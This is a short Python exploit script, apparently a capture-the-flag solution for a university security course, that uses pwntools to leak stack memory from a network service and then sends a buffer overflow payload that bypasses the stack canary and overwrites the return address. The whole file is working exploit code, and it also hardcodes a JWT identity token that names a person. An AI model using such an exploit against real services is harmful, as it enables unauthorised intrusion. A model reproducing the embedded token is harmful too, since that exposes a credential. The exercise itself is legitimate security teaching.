from pwn import *  # type: ignore
import sys
from ctf_helper import *
from pprint import pprint

id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here


def main():

    io = start(7004)
    read_welcome(id_token)

    slowflag = False

    start1 = 0x7fffffffe700
    canary = None

    for i in range(start1, 0x7ffffffff000, 8):
        io.sendline(b"a" * 32 + p64(i))

        val = int(io.read()[:-1])

        print(f"{val:16x}")

        if slowflag:
            match input():
                case "t":
                    canary = val
                case "b":
                    break

        if u64(b"a" * 8) == val:
            slowflag = True

    payload = b"a" * 32 + p64(0x7fffffffe700) + p64(canary) + \
        p64(0x7fffffffe700) + p64(0x4014e5 + 5)
    io.sendline(payload)
    io.interactive()


main()
